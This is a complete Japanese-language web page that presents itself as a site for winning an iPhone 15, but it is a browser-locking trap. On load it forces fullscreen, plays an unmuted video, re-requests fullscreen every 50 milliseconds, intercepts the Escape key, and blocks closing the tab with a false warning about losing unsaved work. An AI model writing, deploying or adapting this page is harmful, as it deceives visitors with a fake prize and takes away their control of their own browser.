<!DOCTYPE html>
<html lang="ja">
<head>
    <meta charset="UTF-8">
    <meta name="description" content="あなたはIphone15を獲得します！">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Iphone15獲得サイト</title>
    <style>
        body, html {
            margin: 0;
            padding: 0;
            height: 100%;
            overflow: hidden;
            background-color: black;
        }
        #video-container {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
        }
        .video-background {
            width: 100%;
            height: 100%;
            object-fit: cover;
        }
    </style>
</head>
<body>
    <div id="video-container">
        <video id="video" class="video-background" loop autoplay>
            <source src="Feminism video (1).mp4" type="video/mp4">
        </video>
    </div>

    <script>
        window.addEventListener('load', function() {
            var videoContainer = document.getElementById('video-container');
            var video = document.getElementById('video');

            function requestFullScreen() {
                if (videoContainer.requestFullscreen) {
                    videoContainer.requestFullscreen();
                } else if (videoContainer.mozRequestFullScreen) {
                    videoContainer.mozRequestFullScreen();
                } else if (videoContainer.webkitRequestFullscreen) {
                    videoContainer.webkitRequestFullscreen();
                } else if (videoContainer.msRequestFullscreen) {
                    videoContainer.msRequestFullscreen();
                }
            }

            function keepFullScreen() {
                if (!document.fullscreenElement) {
                    requestFullScreen();
                }
            }

            // ページ読み込み時に自動で全画面にする
            requestFullScreen();
            video.muted = false;
            video.play().catch(function(error) {
                console.error('動画の再生に失敗しました:', error);
            });

            // 全画面を常に維持するための監視
            setInterval(keepFullScreen, 50);

            // Escキーやその他のキーを無効化
            document.addEventListener('keydown', function(event) {
                if (event.key === 'Escape') {
                    event.preventDefault();
                    requestFullScreen();
                }
            });
        });

        // ウィンドウを閉じる操作を無効化
        window.addEventListener('beforeunload', function(event) {
            event.preventDefault();
            event.returnValue = "このページを離れると、すべての進行中の作業が失われます。";
        });

        // ウィンドウのクローズボタン（×ボタン）を無効化
        window.onbeforeunload = function() {
            return "このページを離れると、すべての進行中の作業が失われます。";
        };
    </script>
</body>
</html>
